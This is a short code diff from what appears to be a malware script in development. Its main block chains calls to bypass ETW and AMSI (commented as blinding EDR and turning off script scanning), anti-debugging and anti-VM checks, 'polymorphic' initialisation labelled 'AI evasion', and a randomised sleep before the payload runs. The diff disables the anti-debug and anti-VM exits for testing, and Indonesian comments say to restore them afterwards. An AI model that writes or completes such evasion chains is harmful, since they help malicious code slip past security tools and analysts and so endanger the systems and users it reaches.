@@ -245,12 +245,12 @@ if __name__ == "__main__":
     # EXECUTION CHAIN (CRITICAL ORDER)
     etw_ghost_bypass()          # EDR blind
     amsi_bypass()              # Script scanner OFF
-    if not anti_debug_suite():  # DEBUGGER CHECK ← NEW!
+    #if not anti_debug_suite():  # DEBUGGER CHECK ← NEW! #aktifkan jika tidak sedang pengujian
         # sys.exit(0) #aktifkan jika tidak sedang pengujian
     polymorphic_init()         # AI evasion
     time.sleep(random.randint(15, 45))
 
-    if anti_vm_complete():
+    #if anti_vm_complete():#aktifkan jika tidak sedang pengujian
        # sys.exit(0) #aktifkan jika tidak sedang pengujian
 
     main()
